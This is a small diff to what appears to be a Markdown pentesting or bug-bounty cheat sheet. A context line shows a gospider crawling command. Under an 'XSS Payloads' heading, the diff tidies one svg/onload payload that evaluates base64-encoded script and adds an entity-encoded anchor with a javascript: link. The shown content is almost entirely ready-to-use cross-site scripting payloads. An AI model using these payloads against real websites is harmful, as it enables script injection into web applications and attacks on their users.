@@ -36,7 +36,8 @@ gospider -a -s abc.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 ### XSS Payloads
 ```js
  img{background-image:url('javascript:alert()')}
- <svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))> 
+ <svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt; 
  ```
 ### Stored XSS Payloads
 ```js
